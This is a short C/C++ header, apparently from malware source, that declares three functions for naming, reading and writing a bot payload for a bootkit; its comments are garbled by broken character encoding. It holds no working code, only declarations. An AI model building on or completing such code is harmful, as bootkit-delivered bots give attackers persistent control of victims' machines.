#include "crypt.h"

//���������� ��� ����� �������������� ����
char* NameFileForBootkit( char* buf, int c_buf );
//���������� ���� ������������ � �������������� ���� 
BYTE* ReadBotForBootkit( DWORD& size );
//������� � ��������� ��� � ������ �������
bool WriteBotForBootkit( BYTE* data, DWORD c_data );
